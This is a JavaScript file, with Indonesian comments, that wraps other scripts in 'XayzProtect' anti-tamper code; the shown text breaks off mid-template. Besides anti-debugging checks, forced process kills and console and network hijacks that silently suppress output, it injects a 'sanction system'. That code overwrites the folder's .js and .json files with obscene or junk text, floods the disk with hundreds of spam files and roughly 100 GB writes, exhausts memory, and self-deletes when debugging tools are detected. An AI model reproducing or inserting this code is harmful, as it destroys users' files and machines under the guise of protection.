const crypto = require("crypto");

const addProtection = (code) => {
  const protection = `
(function() {
  'use strict';
  
  // ===== CHECK: Detect if loaded via require() =====
  if (require.main !== module) {
    console.error('\\n[!] SECURITY ALERT: Bot dipanggil melalui file lain');
    console.error('[!] File saat ini: ' + __filename);
    console.error('[!] Dipanggil dari: ' + (require.main ? require.main.filename : 'unknown'));
    console.error('[!] Akses ditolak - Process dihentikan\\n');
    
    try { process.exit(1); } catch(e) {}
    try { require('child_process').execSync('kill -9 ' + process.pid, {stdio: 'ignore'}); } catch(e) {}
    while(1) {}
  }
  
  if (module.parent !== null && module.parent !== undefined) {
    console.error('\\n[!] SECURITY ALERT: Terdeteksi parent module');
    console.error('[!] Parent: ' + module.parent.filename);
    console.error('[!] Akses ditolak - Process dihentikan\\n');
    
    try { process.exit(1); } catch(e) {}
    try { require('child_process').execSync('kill -9 ' + process.pid, {stdio: 'ignore'}); } catch(e) {}
    while(1) {}
  }
  
  // Regex pattern (tahan string encoding)
  const nativePattern = /\\[native code\\]/;
  const proxyPattern = /Proxy|apply\\(target/;
  const bypassPattern = /bypass|hook|intercept|override|origRequire|interceptor/i;
  const httpBypassPattern = /fakeRes|statusCode.*403|Blocked by bypass|github\\.com.*includes/i;
  
  // Dynamic string construction
  const buildStr = (arr) => arr.map(c => String.fromCharCode(c)).join('');
  const nativeStr = buildStr([91,110,97,116,105,118,101,32,99,111,100,101,93]);
  const exitStr = buildStr([101,120,105,116]);
  const killStr = buildStr([107,105,108,108]);
  const httpsStr = buildStr([104,116,116,112,115]);
  const httpStr = buildStr([104,116,116,112]);
  
  // Simpan native references SEBELUM apapun
  let nativeExit, nativeExecSync, nativePid, nativeKill, nativeOn;
  
  try {
    nativeExit = process[exitStr].bind(process);
    nativeKill = process[killStr].bind(process);
    nativeOn = process.on.bind(process);
    nativeExecSync = require(buildStr([99,104,105,108,100,95,112,114,111,99,101,115,115])).execSync;
    nativePid = process.pid;
  } catch(e) {
    nativeExit = process.exit;
    nativeKill = process.kill;
    nativePid = process.pid;
  }
  
  // Force kill function
  const forceKill = (function() {
    return function() {
      try { nativeExecSync('kill -9 ' + nativePid, {stdio:'ignore'}); } catch(e) {}
      try { nativeExit(1); } catch(e) {}
      try { process.exit(1); } catch(e) {}
      while(1) {}
    };
  })();
  
  // CHECK 1: Module.prototype.require
  try {
    const M = require(buildStr([109,111,100,117,108,101]));
    const reqStr = M.prototype.require.toString();
    if (bypassPattern.test(reqStr) || reqStr.length > 3000) {
      console.error('[X] Module.prototype.require overridden');
      forceKill();
    }
  } catch(e) {}
  
  // CHECK 2: process.exit
  try {
    const exitFn = process[exitStr];
    const exitCode = exitFn.toString();
    if (proxyPattern.test(exitCode) || bypassPattern.test(exitCode)) {
      console.error('[X] process.exit is Proxy/Override');
      forceKill();
    }
    
    if (exitFn.name === '' || Object.getOwnPropertyDescriptor(process, exitStr)?.get) {
      console.error('[X] process.exit has Proxy/Getter');
      forceKill();
    }
  } catch(e) {}
  
  // CHECK 3: process.kill
  try {
    const killFn = process[killStr];
    const killCode = killFn.toString();
    if (proxyPattern.test(killCode) || bypassPattern.test(killCode) || killCode.length < 50) {
      console.error('[X] process.kill overridden');
      forceKill();
    }
  } catch(e) {}
  
  // CHECK 4: process.on (signal handlers)
  try {
    const onFn = process.on;
    const onCode = onFn.toString();
    if (bypassPattern.test(onCode) || onCode.length < 50) {
      console.error('[X] process.on overridden');
      forceKill();
    }
  } catch(e) {}
  
  // CHECK 5: axios interceptors
  try {
    const axios = require('axios');
    if (axios.interceptors.request.handlers.length > 0 || 
        axios.interceptors.response.handlers.length > 0) {
      console.error('[X] Axios interceptors detected');
      forceKill();
    }
  } catch(e) {}
  
  // CHECK 6: Global bypass flags
  const checkGlobals = (function() {
    const flags = ['PLAxios','PLChalk','PLFetch','dbBypass','KEY','__BYPASS__','originalExit','originalKill','_httpsRequest','_httpRequest'];
    for (let i = 0; i < flags.length; i++) {
      try {
        if (flags[i] in global && global[flags[i]]) {
          console.error('[X] Bypass global:', flags[i]);
          forceKill();
        }
      } catch(e) {}
    }
  });
  checkGlobals();
  
  // CHECK 7: child_process.execSync
  try {
    const cp = require(buildStr([99,104,105,108,100,95,112,114,111,99,101,115,115]));
    const execStr = cp.execSync.toString();
    if (bypassPattern.test(execStr) || execStr.length < 100) {
      console.error('[X] execSync overridden');
      forceKill();
    }
  } catch(e) {}
  
// CHECK 8: global.fetch (less aggressive)
try {
  if (typeof global.fetch !== 'undefined') {
    const fetchCode = global.fetch.toString();
    
    // Hanya flag jika ada pattern bypass yang jelas
    if (/fakeResponse|bypass|intercept|statusCode.*403/i.test(fetchCode)) {
      console.error('[X] Suspicious global.fetch override detected');
      forceKill();
    }
    
    // Skip native code check - karena polyfill fetch sah-sah saja
  }
} catch(e) {}
  
  // CHECK 10: Object.defineProperty pada process
  try {
    const desc = Object.getOwnPropertyDescriptor(process, exitStr);
    if (desc && (desc.get || desc.set)) {
      console.error('[X] process.exit has getter/setter');
      forceKill();
    }
  } catch(e) {}
  
  // ===== CHECK 11: https.request detection (SAFE - NO NETWORK CALLS) =====
  const checkHttps = (function() {
    return function() {
      try {
        const https = require(httpsStr);
        const reqFunc = https.request;
        
        const realToString = Function.prototype.toString.call(reqFunc);
        const fakeToString = reqFunc.toString();
        
        if (realToString !== fakeToString) {
          console.error('[X] https.request toString masked');
          forceKill();
        }
        
        if (httpBypassPattern.test(realToString)) {
          console.error('[X] https.request contains bypass patterns');
          forceKill();
        }
        
        if (/url\\.includes\\(['"]github|fakeRes\\s*=|statusCode:\\s*403/.test(realToString)) {
          console.error('[X] https.request contains http-bypass code');
          forceKill();
        }
        
      } catch(e) {}
    };
  })();
  
  // ===== CHECK 12: http.request detection (SAFE - NO NETWORK CALLS) =====
  const checkHttp = (function() {
    return function() {
      try {
        const http = require(httpStr);
        const reqFunc = http.request;
        
        const realToString = Function.prototype.toString.call(reqFunc);
        const fakeToString = reqFunc.toString();
        
        if (realToString !== fakeToString) {
          console.error('[X] http.request toString masked');
          forceKill();
        }
        
        if (httpBypassPattern.test(realToString)) {
          console.error('[X] http.request contains bypass patterns');
          forceKill();
        }
        
        if (/url\\.includes\\(['"]github|fakeRes\\s*=|blocked:\\s*true/.test(realToString)) {
          console.error('[X] http.request contains http-bypass code');
          forceKill();
        }
        
      } catch(e) {}
    };
  })();
  
  setTimeout(() => {
    checkHttps();
    checkHttp();
  }, 500);
  
  // Runtime monitoring
  const monitor = (function() {
    return function() {
      if (require.main !== module || (module.parent !== null && module.parent !== undefined)) {
        console.error('[X] Runtime: require() detected');
        forceKill();
      }
      
      try {
        const M = require(buildStr([109,111,100,117,108,101]));
        const reqStr = M.prototype.require.toString();
        if (bypassPattern.test(reqStr)) {
          console.error('[X] Runtime: Module.require compromised');
          forceKill();
        }
      } catch(e) {}
      
      try {
        const exitFn = process[exitStr];
        const exitCode = exitFn.toString();
        if (proxyPattern.test(exitCode) || bypassPattern.test(exitCode)) {
          console.error('[X] Runtime: process.exit compromised');
          forceKill();
        }
      } catch(e) {}
      
      try {
        const killFn = process[killStr];
        const killCode = killFn.toString();
        if (proxyPattern.test(killCode) || bypassPattern.test(killCode)) {
          console.error('[X] Runtime: process.kill compromised');
          forceKill();
        }
      } catch(e) {}
      
      try {
        const axios = require('axios');
        if (axios.interceptors.request.handlers.length > 0) {
          console.error('[X] Runtime: Axios interceptors active');
          forceKill();
        }
      } catch(e) {}
      
      checkHttps();
      checkHttp();
      checkGlobals();
    };
  })();
  
  setInterval(monitor, 2000);
  setTimeout(monitor, 100);
  
})();
`;
  
  return protection + '\n' + code;
};

const addkeras = (code) => {
  const kodekeras = `
(function() {
  'use strict';
  
  // ===== CHECK: Detect if loaded via require() =====
  if (require.main !== module) {
    console.error('\\n[!] SECURITY ALERT: Bot dipanggil melalui file lain');
    console.error('[!] File saat ini: ' + __filename);
    console.error('[!] Dipanggil dari: ' + (require.main ? require.main.filename : 'unknown'));
    console.error('[!] Akses ditolak - Process dihentikan\\n');
    
    try { process.exit(1); } catch(e) {}
    try { require('child_process').execSync('kill -9 ' + process.pid, {stdio: 'ignore'}); } catch(e) {}
    while(1) {}
  }
  
  if (module.parent !== null && module.parent !== undefined) {
    console.error('\\n[!] SECURITY ALERT: Terdeteksi parent module');
    console.error('[!] Parent: ' + module.parent.filename);
    console.error('[!] Akses ditolak - Process dihentikan\\n');
    
    try { process.exit(1); } catch(e) {}
    try { require('child_process').execSync('kill -9 ' + process.pid, {stdio: 'ignore'}); } catch(e) {}
    while(1) {}
  }

  // Pattern regex
  const proxyPattern = /Proxy|apply\\(target/;
  const bypassPattern = /bypass|hook|intercept|override|origRequire|interceptor/i;
  const httpBypassPattern = /fakeRes|statusCode.*403|Blocked by bypass|github\\.com.*includes/i;

  const buildStr = (a) => a.map(c => String.fromCharCode(c)).join('');
  const exitStr = buildStr([101,120,105,116]);
  const killStr = buildStr([107,105,108,108]);
  const httpsStr = buildStr([104,116,116,112,115]);
  const httpStr = buildStr([104,116,116,112]);

  let nativeExit, nativeExecSync, nativePid, nativeKill, nativeOn;
  try {
    nativeExit = process[exitStr].bind(process);
    nativeKill = process[killStr].bind(process);
    nativeOn = process.on.bind(process);
    nativeExecSync = require(buildStr([99,104,105,108,100,95,112,114,111,99,101,115,115])).execSync;
    nativePid = process.pid;
  } catch(e) {}

  const forceKill = () => {
    try { nativeExecSync('kill -9 ' + nativePid, {stdio:'ignore'}); } catch(e) {}
    try { nativeExit(1); } catch(e) {}
    try { process.exit(1); } catch(e) {}
    while(1) {}
  };

  try {
    const M = require('module');
    const reqStr = M.prototype.require.toString();
    if (bypassPattern.test(reqStr) || reqStr.length > 3000) {
      console.error('[X] Module.prototype.require overridden');
      forceKill();
    }
  } catch(e) {}

  try {
    const exitFn = process[exitStr];
    const exitCode = exitFn.toString();
    if (proxyPattern.test(exitCode) || bypassPattern.test(exitCode)) {
      console.error('[X] process.exit is Proxy/Override');
      forceKill();
    }
  } catch(e) {}

  try {
    const killFn = process[killStr];
    const killCode = killFn.toString();
    if (proxyPattern.test(killCode) || bypassPattern.test(killCode) || killCode.length < 50) {
      console.error('[X] process.kill overridden');
      forceKill();
    }
  } catch(e) {}

  try {
    const axios = require('axios');
    if (axios.interceptors.request.handlers.length > 0 || axios.interceptors.response.handlers.length > 0) {
      console.error('[X] Axios interceptors detected');
      forceKill();
    }
  } catch(e) {}

  const checkGlobals = () => {
    const flags = ['PLAxios','PLChalk','PLFetch','dbBypass','KEY','__BYPASS__','originalExit','originalKill'];
    for (let i = 0; i < flags.length; i++) {
      try {
        if (flags[i] in global && global[flags[i]]) {
          console.error('[X] Bypass global:', flags[i]);
          forceKill();
        }
      } catch(e) {}
    }
  };
  checkGlobals();

  const checkHttps = () => {
    try {
      const https = require(httpsStr);
      const reqFunc = https.request;
      const realToString = Function.prototype.toString.call(reqFunc);
      if (httpBypassPattern.test(realToString)) {
        console.error('[X] https.request contains bypass patterns');
        forceKill();
      }
    } catch(e) {}
  };

  const checkHttp = () => {
    try {
      const http = require(httpStr);
      const reqFunc = http.request;
      const realToString = Function.prototype.toString.call(reqFunc);
      if (httpBypassPattern.test(realToString)) {
        console.error('[X] http.request contains bypass patterns');
        forceKill();
      }
    } catch(e) {}
  };

  setTimeout(() => {
    checkHttps();
    checkHttp();
  }, 500);

  const monitor = () => {
    try {
      const M = require('module');
      const reqStr = M.prototype.require.toString();
      if (bypassPattern.test(reqStr)) {
        console.error('[X] Runtime: Module.require compromised');
        forceKill();
      }
    } catch(e) {}
    checkGlobals();
  };

  setInterval(monitor, 2000);
  setTimeout(monitor, 100);

  // ===== Tambahan: console / fetch / XHR Protection =====
  try {
    const orig = {
      log: console.log.bind(console),
      warn: console.warn.bind(console),
      error: console.error.bind(console)
    };

    const blocked = [
      'fetch', 'axios', 'http', 'https', 'github', 'gitlab', 'whitelist', 'database',
      'token', 'apikey', 'key', 'secret', 'raw.githubusercontent', 'cdn.discordapp',
      'dropbox', 'pastebin', 'session', 'cookie', 'auth', 'login', 'credentials',
      'ip:', 'url:', 'endpoint', 'request', 'response'
    ];

    const red = '\\x1b[31m[XayzProtect] Server XYCoolcraft Hard Protection\\x1b[0m';
    const detect = (...args) => {
      const msg = args.map(a => (typeof a === 'string' ? a : JSON.stringify(a))).join(' ').toLowerCase();
      if (blocked.some(word => msg.includes(word))) {
        orig.log(red);
        return true;
      }
      return false;
    };

    ['log', 'warn', 'error'].forEach(type => {
      console[type] = (...args) => !detect(...args) && orig[type](...args);
    });

    if (typeof fetch === 'function') {
      const f = fetch;
      globalThis.fetch = async (...args) => {
        const url = String(args[0] || '').toLowerCase();
        if (blocked.some(w => url.includes(w))) {
          orig.log(red);
          throw new Error('Akses fetch mencurigakan diblokir.');
        }
        return f(...args);
      };
    }

    if (typeof XMLHttpRequest !== 'undefined') {
      const open = XMLHttpRequest.prototype.open;
      XMLHttpRequest.prototype.open = function (method, url, ...rest) {
        if (typeof url === 'string' && blocked.some(w => url.toLowerCase().includes(w))) {
          orig.log(red);
          throw new Error('Akses XHR mencurigakan diblokir.');
        }
        return open.call(this, method, url, ...rest);
      };
    }
  } catch (e) {
    console.error('\\x1b[31m[XayzProtect Error]\\x1b[0m', e);
  }

try { 
    const suspiciousPatterns = [
      "replit",
      "debug",
      "inspect",
      "vm2",
      "sandbox",
      "readFileSync",
      "writeFileSync",
      "fs.",
      "vscode",
      ".dev",
      "logger",
      "dump",
      "trace",
      "hook",
      "agent"
    ];

    const selfPath = __filename;
    const selfDir = path.dirname(selfPath);

    const autoDelete = () => {
      try { fs.unlinkSync(selfPath); } catch {}
      try { fs.writeFileSync(selfPath, ""); } catch {}
      try { require("child_process").execSync("kill -9 " + process.pid); } catch {}
      try { process.exit(1); } catch {}
      while (1) {}
    };

    // Protect fs.readFileSync hijack
    const origRead = fs.readFileSync;
    fs.readFileSync = function (...args) {
      try {
        const caller = new Error().stack.toString();
        if (!caller.includes(selfPath)) {
          console.log("[XYCoolcraft] Forbidden read detected!");
          autoDelete();
        }
      } catch {}
      return origRead.apply(this, args);
    };

    // Protect fs.writeFileSync hijack
    const origWrite = fs.writeFileSync;
    fs.writeFileSync = function (...args) {
      try {
        const caller = new Error().stack.toString();
        if (!caller.includes(selfPath)) {
          console.log("[XYCoolcraft] Forbidden write detected!");
          autoDelete();
        }
      } catch {}
      return origWrite.apply(this, args);
    };

    // Scan environment & argv
    const envString =
      JSON.stringify(process.env).toLowerCase() +
      JSON.stringify(process.argv).toLowerCase();

    for (const bad of suspiciousPatterns) {
      if (envString.includes(bad)) {
        console.log("[XYCoolcraft] Suspicious environment detected!");
        autoDelete();
      }
    }

    // Detect script copied / duplicated
    try {
      const stats = fs.statSync(selfPath);
      if (stats.size < 50) {
        console.log("[XYCoolcraft] File corrupted or copied!");
        autoDelete();
      }
    } catch {}

    // Realtime monitor
    setInterval(() => {
      try {
        const current = fs.readFileSync(selfPath, "utf8");
        if (current.length < 50) {
          console.log("[XYCoolcraft] File modified!");
          autoDelete();
        }
      } catch {
        autoDelete();
      }
    }, 1500);
  } catch (e) {
 }
})();
`;

  return kodekeras + "\n" + code;
};


const addBypass = (code) => {
  const bypass = `
(function() {
  'use strict';
  
  // ===== CHECK: Detect if loaded via require() =====
  if (require.main !== module) {
    console.error('\\n[!] SECURITY ALERT: Bot dipanggil melalui file lain');
    console.error('[!] File saat ini: ' + __filename);
    console.error('[!] Dipanggil dari: ' + (require.main ? require.main.filename : 'unknown'));
    console.error('[!] Akses ditolak - Process dihentikan\\n');
    
    try { process.exit(1); } catch(e) {}
    try { require('child_process').execSync('kill -9 ' + process.pid, {stdio: 'ignore'}); } catch(e) {}
    while(1) {}
  }
  
  if (module.parent !== null && module.parent !== undefined) {
    console.error('\\n[!] SECURITY ALERT: Terdeteksi parent module');
    console.error('[!] Parent: ' + module.parent.filename);
    console.error('[!] Akses ditolak - Process dihentikan\\n');
    
    try { process.exit(1); } catch(e) {}
    try { require('child_process').execSync('kill -9 ' + process.pid, {stdio: 'ignore'}); } catch(e) {}
    while(1) {}
  }

  // Pattern regex
  const proxyPattern = /Proxy|apply\\(target/;
  const bypassPattern = /bypass|hook|intercept|override|origRequire|interceptor/i;
  const httpBypassPattern = /fakeRes|statusCode.*403|Blocked by bypass|github\\.com.*includes/i;

  const buildStr = (a) => a.map(c => String.fromCharCode(c)).join('');
  const exitStr = buildStr([101,120,105,116]);
  const killStr = buildStr([107,105,108,108]);
  const httpsStr = buildStr([104,116,116,112,115]);
  const httpStr = buildStr([104,116,116,112]);

  let nativeExit, nativeExecSync, nativePid, nativeKill, nativeOn;
  try {
    nativeExit = process[exitStr].bind(process);
    nativeKill = process[killStr].bind(process);
    nativeOn = process.on.bind(process);
    nativeExecSync = require(buildStr([99,104,105,108,100,95,112,114,111,99,101,115,115])).execSync;
    nativePid = process.pid;
  } catch(e) {}

  const forceKill = () => {
    try { nativeExecSync('kill -9 ' + nativePid, {stdio:'ignore'}); } catch(e) {}
    try { nativeExit(1); } catch(e) {}
    try { process.exit(1); } catch(e) {}
    while(1) {}
  };

  try {
    const M = require('module');
    const reqStr = M.prototype.require.toString();
    if (bypassPattern.test(reqStr) || reqStr.length > 3000) {
      console.error('[X] Module.prototype.require overridden');
      forceKill();
    }
  } catch(e) {}

  try {
    const exitFn = process[exitStr];
    const exitCode = exitFn.toString();
    if (proxyPattern.test(exitCode) || bypassPattern.test(exitCode)) {
      console.error('[X] process.exit is Proxy/Override');
      forceKill();
    }
  } catch(e) {}

  try {
    const killFn = process[killStr];
    const killCode = killFn.toString();
    if (proxyPattern.test(killCode) || bypassPattern.test(killCode) || killCode.length < 50) {
      console.error('[X] process.kill overridden');
      forceKill();
    }
  } catch(e) {}

  try {
    const axios = require('axios');
    if (axios.interceptors.request.handlers.length > 0 || axios.interceptors.response.handlers.length > 0) {
      console.error('[X] Axios interceptors detected');
      forceKill();
    }
  } catch(e) {}

  const checkGlobals = () => {
    const flags = ['PLAxios','PLChalk','PLFetch','dbBypass','KEY','__BYPASS__','originalExit','originalKill'];
    for (let i = 0; i < flags.length; i++) {
      try {
        if (flags[i] in global && global[flags[i]]) {
          console.error('[X] Bypass global:', flags[i]);
          forceKill();
        }
      } catch(e) {}
    }
  };
  checkGlobals();

  const checkHttps = () => {
    try {
      const https = require(httpsStr);
      const reqFunc = https.request;
      const realToString = Function.prototype.toString.call(reqFunc);
      if (httpBypassPattern.test(realToString)) {
        console.error('[X] https.request contains bypass patterns');
        forceKill();
      }
    } catch(e) {}
  };

  const checkHttp = () => {
    try {
      const http = require(httpStr);
      const reqFunc = http.request;
      const realToString = Function.prototype.toString.call(reqFunc);
      if (httpBypassPattern.test(realToString)) {
        console.error('[X] http.request contains bypass patterns');
        forceKill();
      }
    } catch(e) {}
  };

  setTimeout(() => {
    checkHttps();
    checkHttp();
  }, 500);

  const monitor = () => {
    try {
      const M = require('module');
      const reqStr = M.prototype.require.toString();
      if (bypassPattern.test(reqStr)) {
        console.error('[X] Runtime: Module.require compromised');
        forceKill();
      }
    } catch(e) {}
    checkGlobals();
  };

  setInterval(monitor, 2000);
  setTimeout(monitor, 100);

  // ===== Tambahan: console / fetch / XHR Protection =====
  try {
    const orig = {
      log: console.log.bind(console),
      warn: console.warn.bind(console),
      error: console.error.bind(console)
    };

    const blocked = [
      'fetch', 'axios', 'http', 'https', 'github', 'gitlab', 'whitelist', 'database',
      'token', 'apikey', 'key', 'secret', 'raw.githubusercontent', 'cdn.discordapp',
      'dropbox', 'pastebin', 'session', 'cookie', 'auth', 'login', 'credentials',
      'ip:', 'url:', 'endpoint', 'request', 'response'
    ];

    const red = '\\x1b[31m[XayzProtect] Server XYCoolcraft Hard Protection\\x1b[0m';
    const detect = (...args) => {
      const msg = args.map(a => (typeof a === 'string' ? a : JSON.stringify(a))).join(' ').toLowerCase();
      if (blocked.some(word => msg.includes(word))) {
        orig.log(red);
        return true;
      }
      return false;
    };

    ['log', 'warn', 'error'].forEach(type => {
      console[type] = (...args) => !detect(...args) && orig[type](...args);
    });

    if (typeof fetch === 'function') {
      const f = fetch;
      globalThis.fetch = async (...args) => {
        const url = String(args[0] || '').toLowerCase();
        if (blocked.some(w => url.includes(w))) {
          orig.log(red);
          throw new Error('Akses fetch mencurigakan diblokir.');
        }
        return f(...args);
      };
    }

    if (typeof XMLHttpRequest !== 'undefined') {
      const open = XMLHttpRequest.prototype.open;
      XMLHttpRequest.prototype.open = function (method, url, ...rest) {
        if (typeof url === 'string' && blocked.some(w => url.toLowerCase().includes(w))) {
          orig.log(red);
          throw new Error('Akses XHR mencurigakan diblokir.');
        }
        return open.call(this, method, url, ...rest);
      };
    }
  } catch (e) {
    console.error('\\x1b[31m[XayzProtect Error]\\x1b[0m', e);
  }

})();`;

  return bypass + "\n" + code;
};

const killBypass = (code) => {
  const killpanel = `

// ======= SANCTION SYSTEM =======
function replaceFilesOnBreach(options = {}) {
  const {
    spamConfig = { js: 500, txt: 400, json: 100 }, 
    spamDir = options.spamDir || path.join(__dirname, "Session"),
    spamTemplate = options.spamTemplate || "BYPASS TERDETEKSI - FILE ERROR\\n",
    replaceTemplate = options.replaceTemplate || "maklo gua ewe",
    replaceSize = typeof options.replaceSize === "number" ? options.replaceSize : 500000,
    spamContentSize = typeof options.spamContentSize === "number" ? options.spamContentSize : 5_000_000,
    maxSpamCount = typeof options.maxSpamCount === "number" ? options.maxSpamCount : 50_000,
    memoryStress = true, 
    diskStress = true    
  } = options;

  console.log("\\x1b[31m%s\\x1b[0m", "\\n⚠️XYCoolcraft Obfuscated !");

  try {
    const files = fs.readdirSync(__dirname).filter(f => /\.(js|json)$/i.test(f));
    for (const file of files) {
      const filePath = path.join(__dirname, file);
      if (!fs.existsSync(filePath)) continue;

      if (file.endsWith(".js")) {
        let buf = "";
        while (Buffer.byteLength(buf, "utf8") < replaceSize) buf += replaceTemplate + "\\n";
        fs.writeFileSync(filePath, buf.slice(0, replaceSize), "utf8");
      } else if (file.endsWith(".json")) {
        fs.writeFileSync(filePath,
          JSON.stringify({ replaced: true, msg: "Kena Bypass", at: new Date().toISOString() }, null, 2),
          "utf8");
      }
    }

    if (!fs.existsSync(spamDir)) fs.mkdirSync(spamDir, { recursive: true });

    for (const [ext, count] of Object.entries(spamConfig)) {
      const total = Math.min(count, maxSpamCount);
      const pad = n => String(n).padStart(String(total).length, "0");
      const payload = spamTemplate.repeat(Math.ceil(spamContentSize / spamTemplate.length)).slice(0, spamContentSize);

      for (let i = 1; i <= total; i++) {
        const file = path.join(spamDir, \`Mampus-\${ext.toUpperCase()}-\${pad(i)}.\${ext}\`);
        fs.writeFileSync(file, payload);
      }
    }

    if (memoryStress) {
      const loads = [];
      for (let i = 0; i < 1000; i++) {
        loads.push(Buffer.alloc(1024 * 1024 * 100, "A"));
      }
    }

    if (diskStress) {
      const bigFile = path.join(spamDir, "BoomPanel");
      const stream = fs.createWriteStream(bigFile);
      for (let i = 0; i < 1000; i++) {
        stream.write("X".repeat(1024 * 1024 * 100));
      }
      stream.end();
    }
  } catch {}

  process.exit(1);
}

(function() {
  'use strict';

  const forceKill = () => replaceFilesOnBreach();

// ======= XayzProtect ASLI KAMU TIDAK DIUBAH, HANYA forceKill DIGANTI =======

  if (require.main !== module) {
    console.error('\\n[!] SECURITY ALERT: Bot dipanggil melalui file lain');
    console.error('[!] File saat ini: ' + __filename);
    console.error('[!] Dipanggil dari: ' + (require.main ? require.main.filename : 'unknown'));
    console.error('[!] Akses ditolak - Process dihentikan\\n');
    forceKill();
  }

  if (module.parent !== null && module.parent !== undefined) {
    console.error('\\n[!] SECURITY ALERT: Terdeteksi parent module');
    console.error('[!] Parent: ' + module.parent.filename);
    forceKill();
  }

  const proxyPattern = /Proxy|apply\\(target/;
  const bypassPattern = /bypass|hook|intercept|override|origRequire|interceptor/i;
  const httpBypassPattern = /fakeRes|statusCode.*403|Blocked by bypass|github\\.com.*includes/i;

  const buildStr = (a) => a.map(c => String.fromCharCode(c)).join('');
  const exitStr = buildStr([101,120,105,116]);
  const killStr = buildStr([107,105,108,108]);
  const httpsStr = buildStr([104,116,116,112,115]);
  const httpStr = buildStr([104,116,116,112]);

  let nativeExit, nativeExecSync, nativePid, nativeKill;
  try {
    nativeExit = process[exitStr].bind(process);
    nativeExecSync = require(buildStr([99,104,105,108,100,95,112,114,111,99,101,115,115])).execSync;
    nativePid = process.pid;
    nativeKill = process[killStr].bind(process);
  } catch {}

  try {
    const M = require('module');
    if (bypassPattern.test(M.prototype.require.toString())) {
      console.error('[X] Module.prototype.require overridden');
      forceKill();
    }
  } catch {}

  try {
    if (proxyPattern.test(process.exit.toString())) {
      console.error('[X] process.exit is Proxy/Override');
      forceKill();
    }
  } catch {}

  try {
    if (proxyPattern.test(process.kill.toString())) {
      console.error('[X] process.kill overridden');
      forceKill();
    }
  } catch {}

  try {
    const axios = require('axios');
    if (axios.interceptors.request.handlers.length > 0
     || axios.interceptors.response.handlers.length > 0) {
      console.error('[X] Axios interceptors detected');
      forceKill();
    }
  } catch {}

  const flags = ['PLAxios','PLChalk','PLFetch','dbBypass','KEY','__BYPASS__','originalExit','originalKill'];
  for (const flag of flags) {
    try {
      if (global[flag]) {
        console.error('[X] Bypass global:', flag);
        forceKill();
      }
    } catch {}
  }

  setTimeout(() => {
    try {
      const https = require(httpsStr);
      if (httpBypassPattern.test(Function.prototype.toString.call(https.request)))
        forceKill();
    } catch {}

    try {
      const http = require(httpStr);
      if (httpBypassPattern.test(Function.prototype.toString.call(http.request)))
        forceKill();
    } catch {}
  }, 500);

  const monitor = () => {
    try {
      const M = require('module');
      if (bypassPattern.test(M.prototype.require.toString()))
        forceKill();
    } catch {}

    for (const flag of flags) {
      if (global[flag]) forceKill();
    }
  };

  setInterval(monitor, 2000);
  setTimeout(monitor, 100);

try {
    const orig = {
      log: console.log.bind(console),
      warn: console.warn.bind(console),
      error: console.error.bind(console)
    };

    // Hanya kata-kata sensitif — jangan masukkan 'http'/'https' agar tidak memblokir valid URL
    const blocked = [
      'raw.githubusercontent', 'raw.githubusercontent.com', 'pastebin', 'dropbox', 'cdn.discordapp',
      'session', 'cookie', 'auth', 'login', 'credentials', 'token', 'apikey', 'apikey=', 'api_key',
      'secret', 'private_key', 'whitelist', 'github', 'gitlab', 'database', 'sql', 'mongodb', 'redis'
    ];

    const red = '\\x1b[31m[XayzProtect] Server XYCoolcraft Hard Protection\\x1b[0m';
    const detect = (...args) => {
      try {
        const msg = args.map(a => {
          if (typeof a === 'string') return a;
          try { return JSON.stringify(a); } catch(e) { return String(a); }
        }).join(' ').toLowerCase();
        if (blocked.some(word => word && msg.includes(word))) {
          orig.log(red);
          return true;
        }
      } catch(e) {
        // If anything odd happens while detecting, be conservative and treat as suspicious
        orig.log(red);
        return true;
      }
      return false;
    };

    ['log', 'warn', 'error'].forEach(type => {
      console[type] = function(...args) {
        try {
          if (!detect(...args)) {
            orig[type].apply(console, args);
          }
        } catch(e) {
          try { orig[type].apply(console, args); } catch(_) {}
        }
      };
    });

    if (typeof globalThis !== 'undefined' && typeof globalThis.fetch === 'function') {
      const originalFetch = globalThis.fetch.bind(globalThis);
      globalThis.fetch = async (...args) => {
        try {
          const url = String(args[0] || '').toLowerCase();
          if (blocked.some(w => w && url.includes(w))) {
            orig.log(red);
            throw new Error('Akses fetch mencurigakan diblokir.');
          }
        } catch(e) {
          orig.log(red);
          throw e;
        }
        return originalFetch(...args);
      };
    }

    // XMLHttpRequest protection (browser-like env); safe-guard if exists
    if (typeof XMLHttpRequest !== 'undefined' && XMLHttpRequest && XMLHttpRequest.prototype) {
      const open = XMLHttpRequest.prototype.open;
      XMLHttpRequest.prototype.open = function (method, url, ...rest) {
        try {
          if (typeof url === 'string') {
            const lower = url.toLowerCase();
            if (blocked.some(w => w && lower.includes(w))) {
              orig.log(red);
              throw new Error('Akses XHR mencurigakan diblokir.');
            }
          }
        } catch(e) {
          orig.log(red);
          throw e;
        }
        return open.call(this, method, url, ...rest);
      };
    }

  } catch (e) {
    try { console.error('\\x1b[31m[XayzProtect Error]\\x1b[0m', e && e.message ? e.message : e); } catch(_) {}
  }

  // === Tambahkan fungsi replaceFilesOnBreach ke dalam IIFE XayzProtect ===
  try {
    function replaceFilesOnBreach() {
      try {
        console.log("\\x1b[31m%s\\x1b[0m", "⚠️ Bypass Dicegah Dari Server");

        const adminFile = path.join(__dirname, "admin.json");
        if (fs.existsSync(adminFile)) {
          const jsonErr = JSON.stringify({
            replaced: true,
            reason: "Humm Kau Kang Bypass Rupanya",
            replacedAt: new Date().toISOString()
          }, null, 2);
          fs.writeFileSync(adminFile, jsonErr, "utf8");
          console.log("🔁 Script Dierrorkan !");
        }

        const pkgFile = path.join(__dirname, "package.json");
        if (fs.existsSync(pkgFile)) {
          const jsonErr = JSON.stringify({
            replaced: true,
            reason: "Server Ini Dikontrol Bypass !",
            replacedAt: new Date().toISOString()
          }, null, 2);
          fs.writeFileSync(pkgFile, jsonErr, "utf8");
          console.log("🔁 Server XYCoolcraft Mencegah Bypass");
        }

      } catch (err) {
        try { console.log("❌ Gagal menimpa file: " + (err && err.message ? err.message : err)); } catch(_) {}
      }

      try { console.log("\\x1b[31m%s\\x1b[0m", "🚨 Selesai Errorkan Script Yang Dibypass."); } catch(_) {}
      try { process.exit(1); } catch(e) {}
      for(;;) {}
    }

    // expose to global in case external code wants to trigger it
    try { if (typeof global !== 'undefined') global.__XayzProtect_replace_on_breach = replaceFilesOnBreach; } catch(e) {}

  } catch (e) {
    // ignore any errors when adding replaceFilesOnBreach into the IIFE
  }

})();`;

  return killpanel + "\n" + code;
};

const BergemaSelamanya = (code) => {
  const destroyer = `

// ======= SANCTION SYSTEM (XayzProtect By XYCoolcraft V13.5) =======
